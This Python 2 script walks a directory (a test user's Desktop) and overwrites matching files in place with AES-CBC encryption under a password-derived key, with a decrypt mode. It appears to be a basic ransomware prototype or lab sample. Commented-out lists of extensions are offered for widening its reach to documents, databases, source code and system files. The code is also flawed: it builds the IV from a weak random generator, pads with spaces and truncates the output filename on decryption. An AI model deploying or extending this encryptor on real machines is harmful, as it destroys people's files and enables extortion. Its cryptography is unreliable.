import os, random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0,0xFF))

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize)
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 !=  0:
                    chunk += ' ' *  (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def decrypt(key, filename):
    chunksize = 64*1024
    outputFile = filename[:22]

    with open(filename, 'rb') as infile:
        filesize = long(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(filesize)

def getKey(password):
    hasher = SHA256.new(password)
    return hasher.digest()

def Main():
    startdirs = ["C:\Users\test\Desktop"]
    
    choice = raw_input("Would you like to (E)ncrypt or (D)ecrypt?: ")
    if choice == 'E':
        #filename = raw_input("File to encrypt: ")
        password = raw_input("Password: ")
        
        for currentDir in startdirs:
            for file in discoverFiles(currentDir):
                encrypt(getKey(password), file)
        print "Done."

    elif choice == 'D':
        #filename = raw_input("File to decrypt: ")
        password = raw_input("Password: ")
        for currentDir in startdirs:
            for file in discoverFiles(currentDir):
                decrypt(getKey(password), file)
        print "Done."
    else:
        print "No option selected. Closing..."

def discoverFiles(startpath):

    # This is a file extension list of all files that may want to be encrypted.
    # They are grouped by category. If a category is not wanted, Comment that line.
    # All files uncommented by default should be harmless to the system
    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
    # BUT applications which depend on such resources may become broken.
    # This will not cover all files, but it should be a decent range.
    extensions = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', #'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        #'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        #'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

        #'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        #'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        #'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        #'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        #'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        #'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        #'java', 'class', 'jar', # java source code
        #'ps', 'bat', 'vb', # windows based scripts
        #'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        #'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        #'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

if __name__ == '__main__':
    Main()


